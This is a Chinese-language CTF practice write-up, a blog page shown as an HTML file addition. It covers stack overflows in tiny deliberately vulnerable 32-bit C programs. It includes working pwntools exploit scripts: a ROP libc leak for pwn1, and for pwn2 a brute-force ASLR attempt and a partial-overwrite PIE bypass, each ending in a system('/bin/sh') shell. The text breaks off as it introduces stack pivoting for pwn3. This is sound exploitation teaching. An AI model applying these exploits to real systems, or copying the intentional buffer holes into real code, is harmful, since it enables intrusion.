@@ -1,0 +1,1183 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="这是几道关于read和write的练习题，因为是练习题，就不用太花里胡哨了，只保留漏洞点就可以了。嗯，大概是就是只有两句代码的意思吧。">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="32位下花样read_write">
+<meta property="og:url" content="https://veritas501.github.io/2017/04/23/32位下花样read_write/index.html">
+<meta property="og:site_name" content="Veritas501&#39;s Blog">
+<meta property="og:description" content="这是几道关于read和write的练习题，因为是练习题，就不用太花里胡哨了，只保留漏洞点就可以了。嗯，大概是就是只有两句代码的意思吧。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_7769e46c0e37d06fb43528af42054741.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_f52af45f237fb13bbc9ff6ae98e456be.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_c454ca10d50fe6de5479708f076c3086.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_043af3e9c72f9e020e63f4ebb0e9543f.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_bc511cc3a4f1cc0f6271fe84ae7edc3a.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_c6cd16719f98f4584d3a1da0cde4a015.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_5988e4083ce15b6df2fdd8c6d5294a02.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_41120c19934ea1128f40319391c7c7fc.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_accf0df1b7a0dfef64d8af65c8add828.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_1b5247ed4d475e444e4510d403db9e90.png">
+<meta property="og:updated_time" content="2017-08-25T06:33:45.284Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="32位下花样read_write">
+<meta name="twitter:description" content="这是几道关于read和write的练习题，因为是练习题，就不用太花里胡哨了，只保留漏洞点就可以了。嗯，大概是就是只有两句代码的意思吧。">
+<meta name="twitter:image" content="http://ordvwjm69.bkt.clouddn.com/read_write_7769e46c0e37d06fb43528af42054741.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://veritas501.github.io/2017/04/23/32位下花样read_write/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>32位下花样read_write | Veritas501's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Veritas501's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-guestbook">
+    <a href="/Guestbook" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br />guestbook</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://veritas501.github.io/2017/04/23/32位下花样read_write/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Veritas501">
+      <meta itemprop="description" content="开始踏上Re&Pwn之路...">
+      <meta itemprop="image" content="/images/215.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veritas501's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">32位下花样read_write
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-04-23 00:00:00" itemprop="dateCreated datePublished" datetime="2017-04-23T00:00:00+08:00">2017-04-23</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2017-08-25 14:33:45" itemprop="dateModified" datetime="2017-08-25T14:33:45+08:00">2017-08-25</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/23/32位下花样read_write/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2017/04/23/32位下花样read_write/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/04/23/32位下花样read_write/" class="leancloud_visitors" data-flag-title="32位下花样read_write">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这是几道关于read和write的练习题，因为是练习题，就不用太花里胡哨了，只保留漏洞点就可以了。嗯，大概是就是只有两句代码的意思吧。</p>
+<a id="more"></a>
+<hr>
+<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p>代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc pwn1_2.c -m32 -fno-stack-protector -o pwn1_2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x100</span>);</span><br><span class="line">    write(<span class="number">1</span>,buffer,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn1_2.c -m32 -fno-stack-protector -o pwn1_2</span><br></pre></td></tr></table></figure></p>
+<p>checksec:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p>
+<p>开了nx，但是有read和write，用rop就可以完整任意地址的读写，比较简单的一道题目。</p>
+<p>可以先leak比如read的地址，然后根据libc算出system的地址。</p>
+<p>poc：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./pwn1_2'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./pwn1_2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p3ret = <span class="number">0x080484f9</span></span><br><span class="line"></span><br><span class="line">stuff = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'bbbb'</span></span><br><span class="line"></span><br><span class="line">pay = p32(bin.plt[<span class="string">'write'</span>]) + p32(p3ret) + p32(<span class="number">1</span>) + p32(bin.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">pay += p32(bin.symbols[<span class="string">'main'</span>])</span><br><span class="line"><span class="comment">#leak p_read,return to main</span></span><br><span class="line">cn.sendline(stuff+pay)</span><br><span class="line">cn.recv(<span class="number">0x100</span>)</span><br><span class="line">p_read = u32(cn.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p_system = p_read - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">pay = p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(bin.bss()) + p32(<span class="number">0x10</span>)</span><br><span class="line">pay += p32(p_system) + <span class="string">'bbbb'</span> + p32(bin.bss())</span><br><span class="line"><span class="comment">#write '/bin/sh' to bss ,call system get shell</span></span><br><span class="line">cn.sendline(stuff + pay)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p>代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc pwn2.c -m32 -Wl,-z,relro,-z,now -pie -o pwn2_2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x100</span>);</span><br><span class="line">    write(<span class="number">1</span>,buffer,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn2.c -m32 -Wl,-z,relro,-z,now -pie -o pwn2_2</span><br></pre></td></tr></table></figure></p>
+<p>checksec:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
+<p>代码和pwn1一样，但除了canary没开，其他保护都开了。</p>
+<p>如果考虑爆破的话，这题的poc是这样的，但毫无智商可言。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># baoli</span></span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line">p_system = <span class="number">0xf75ab000</span> + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">p_binsh = <span class="number">0xf75ab000</span> + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="comment">#system和/bin/sh的相对地址是不变的，基址是改变的（libc开了pie），考虑到总有一时刻的基址会和我们设置的基址一样（只随机中间的两字节，在x86上），在那一时刻，我们的脚本能拿shell，所以不断跑脚本就可以了。</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	cn = process(<span class="string">'./pwn2_2'</span>)</span><br><span class="line">	pay = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'bbbb'</span> + p32(p_system) +<span class="string">'bbbb'</span> + p32(p_binsh)</span><br><span class="line">	cn.send(pay)</span><br><span class="line">	cn.recv()</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		cn.sendline(<span class="string">'echo aaaaa'</span>)</span><br><span class="line">		echo = cn.recv()[:<span class="number">4</span>]</span><br><span class="line">		<span class="keyword">print</span> echo</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'try fail'</span></span><br><span class="line">		cn.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">if</span> echo == <span class="string">'aaaa'</span>:<span class="comment">#make sure we get shell</span></span><br><span class="line">		cn.interactive()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'got end'</span></span><br><span class="line">	cn.close()</span><br></pre></td></tr></table></figure>
+<p>现在想不用爆破的。</p>
+<p>首先，第一点难在开了pie，我们再构造rop的时候无法预先知道欲跳转到code段代码的真实地址（比如跳回到main）。</p>
+<p>还没运行时，gdb看到的是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmm</span><br><span class="line">Warning: not running or target is remote</span><br><span class="line">Start      End        Perm	Name</span><br><span class="line">0x0000044c 0x000006f8 rx-p	/home/veritas/pwn/exercise/read_write/pwn2/pwn2_2</span><br><span class="line">0x00000154 0x00000820 r--p	/home/veritas/pwn/exercise/read_write/pwn2/pwn2_2</span><br><span class="line">0x00001edc 0x0000200c rw-p	/home/veritas/pwn/exercise/read_write/pwn2/pwn2_2</span><br></pre></td></tr></table></figure></p>
+<p>上面都是相对地址。等真正运行了地址会变成这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmm</span><br><span class="line">Start      End        Perm	Name</span><br><span class="line">0x56555000 0x56556000 r-xp	/home/veritas/pwn/exercise/read_write/pwn2/pwn2_2</span><br><span class="line">0x56556000 0x56557000 r--p	/home/veritas/pwn/exercise/read_write/pwn2/pwn2_2</span><br><span class="line">0x56557000 0x56558000 rw-p	/home/veritas/pwn/exercise/read_write/pwn2/pwn2_2</span><br><span class="line">0xf7e04000 0xf7e05000 rw-p	mapped</span><br><span class="line">0xf7e05000 0xf7fb2000 r-xp	/lib32/libc-2.23.so</span><br><span class="line">0xf7fb2000 0xf7fb3000 ---p	/lib32/libc-2.23.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 r--p	/lib32/libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb6000 rw-p	/lib32/libc-2.23.so</span><br><span class="line">0xf7fb6000 0xf7fba000 rw-p	mapped</span><br><span class="line">0xf7fd6000 0xf7fd8000 r--p	[vvar]</span><br><span class="line">0xf7fd8000 0xf7fd9000 r-xp	[vdso]</span><br><span class="line">0xf7fd9000 0xf7ffb000 r-xp	/lib32/ld-2.23.so</span><br><span class="line">0xf7ffb000 0xf7ffc000 rw-p	mapped</span><br><span class="line">0xf7ffc000 0xf7ffd000 r--p	/lib32/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p	/lib32/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rw-p	[stack]</span><br></pre></td></tr></table></figure></p>
+<p>这里说一下，gdb如果不设置，是会默认禁用pie的，所以你每次用gdb调试时看到的地址都是上面这个，而实际情况并不是这样（可以用attach观察）。</p>
+<p><strong>重点</strong>：pie有一个特点，他是按页来随机的，所以最低的一字节是不会改变的。我们通过溢出只修改返回值的最低位（little-endian所以在最低位在低址上）就可以<strong>实现0x100范围内的短跳</strong>。</p>
+<p>这里，程序本来会跳转到main的结尾，现在我们可以覆盖一字节让他从新跳到main上，有了二次输入的机会。</p>
+<p>另一方面我们从刚才write出来的0x100字节中可以得到开了pie以后code段的基地址和libc中某些函数地址的信息。</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/read_write_7769e46c0e37d06fb43528af42054741.png" alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cn.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">base = u32(cn.recv(<span class="number">4</span>)) - <span class="number">0x655</span></span><br><span class="line">cn.recv(<span class="number">4</span>*<span class="number">3</span>)</span><br><span class="line">p_libc_start_main = u32(cn.recv(<span class="number">4</span>)) - <span class="number">247</span></span><br><span class="line">cn.recv()</span><br></pre></td></tr></table></figure>
+<p>有了这两点就可以直接算出system和/bin/sh的地址，以及欲跳转到的代码的地址，直接用一次rop调用system拿shell即可。</p>
+<p>下面就是不需要爆破的poc：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">cn = process(<span class="string">'./pwn2_2'</span>)</span><br><span class="line">bin = ELF(<span class="string">'./pwn2_2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line">p3ret = <span class="number">0x000006D9</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'bbbb'</span> + chr(<span class="number">0x55</span>)<span class="comment"># chr(0x55) change the ret addr to main</span></span><br><span class="line">gdb.attach(cn)</span><br><span class="line">raw_input()</span><br><span class="line">cn.send(pay)</span><br><span class="line">cn.recvuntil(<span class="string">'bbbb'</span>)</span><br><span class="line">base = u32(cn.recv(<span class="number">4</span>)) - <span class="number">0x655</span> <span class="comment"># 0x655 is the offset of main</span></span><br><span class="line">cn.recv(<span class="number">4</span>*<span class="number">3</span>)</span><br><span class="line">p_libc_start_main = u32(cn.recv(<span class="number">4</span>)) - <span class="number">247</span></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"base:"</span> + hex(base)</span><br><span class="line">p_system = p_libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(p_libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">p_binsh = p_libc_start_main - libc.symbols[<span class="string">'__libc_start_main'</span>] + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'bbbb'</span> + p32(p_system) + <span class="string">'bbbb'</span> + p32(p_binsh)</span><br><span class="line"></span><br><span class="line">cn.send(pay)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p>代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void fun()&#123;</span><br><span class="line">    char buffer[0x20];</span><br><span class="line">    read(0,buffer,0x30);</span><br><span class="line">    write(1,buffer,0x30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    fun();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn3.c -m32 -fno-stack-protector -o pwn3</span><br></pre></td></tr></table></figure>
+<p>checksec：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>和pwn1唯一不同的就溢出的字节数变少了很多。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t fun()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [sp+0h] [bp-28h]@1</span><br><span class="line"></span><br><span class="line">  read(0, &amp;buf, 0x30u);</span><br><span class="line">  return write(1, &amp;buf, 0x30u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以发现，我们最多也只能覆盖ebp和ret，在这种情况下我们如何使用ROP呢？</p>
+<p>你大概需要知道一种技巧叫做<strong>栈迁移(stack migrate)</strong>。</p>
+<p>先贴上fun的汇编代码：</p>
